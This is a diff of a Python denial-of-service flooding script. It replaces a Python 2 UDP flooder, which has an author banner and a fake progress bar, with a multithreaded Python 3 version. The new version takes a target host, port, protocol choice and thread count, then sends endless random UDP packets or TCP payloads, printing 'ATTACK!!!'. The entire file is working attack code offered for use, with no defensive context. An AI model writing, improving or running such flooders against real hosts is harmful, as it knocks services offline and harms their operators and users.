@@ -1,50 +1,46 @@
-import sys
-import os
-import time
-import socket
+#!/usr/bin/env python3
+
 import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+import socket
+import threading
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
+ip = str(input(" HOST/IP:"))
+port = int(input(" PORT:"))
+choice = str(input(" UDP(Y/N):"))	
+times = int(input(" PACKETS PER ONE CONNECTION:"))
+threads = int(input(" THREADS:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[>]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"ATTACK!!!")
+		except:
+			print("[!] ERROR!!!")
+			
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[>]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" ATTACK!!!")
+		except:
+			s.close()
+			print("[*] ERROR!!!")
 
-os.system("clear")
-os.system("figlet DDos Attack")
-print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
-
-os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+for Y in range(threads):
+	if choice == 'Y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
